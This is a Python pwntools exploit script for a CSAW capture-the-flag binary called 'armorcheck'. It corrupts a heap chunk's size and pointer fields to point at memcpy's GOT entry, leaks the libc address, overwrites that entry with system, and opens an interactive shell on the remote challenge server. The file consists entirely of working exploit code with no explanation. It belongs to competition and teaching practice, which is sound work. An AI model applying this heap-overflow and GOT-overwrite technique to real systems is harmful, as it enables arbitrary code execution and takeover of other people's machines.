from pwn import *

e = ELF("./armorcheck")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("red.chal.csaw.io", 5001)
else:
  p = process(e.path)
  #, env={"LD_PRELOAD": libc.path})

p.sendlineafter(">", "1")
p.sendlineafter(">", "AAAA")
p.sendlineafter(">", "DESC")

p.sendlineafter(">", "1")
p.sendlineafter(">", "AAAA")
p.sendlineafter(">", "DESC")

debug()
p.sendlineafter(">", "2")
p.sendlineafter(">", "0")
p.sendlineafter(">", "AAAA".ljust(0x10, "\x00") + "\xff\xff")
p.sendlineafter(">", "A" * 0x18 + p64(0x31) + "B" * 16 + p32(0x10) + p32(0) + p64(e.got["memcpy"]))

p.sendlineafter(">", "3")
p.sendlineafter(">", "1")

p.recvuntil("\n   ")

leak = u64(p.recvline(keepends=False).ljust(8, "\x00")) - libc.symbols["memcpy"]
print(hex(leak))

p.sendlineafter(">", "2")
p.sendlineafter(">", "1")
p.sendlineafter(">", "/bin/sh\x00")
p.sendlineafter(">", p64(leak + libc.symbols["system"]))

p.sendlineafter(">", "2")
p.sendlineafter(">", "1")
p.sendlineafter(">", "A")


p.interactive()
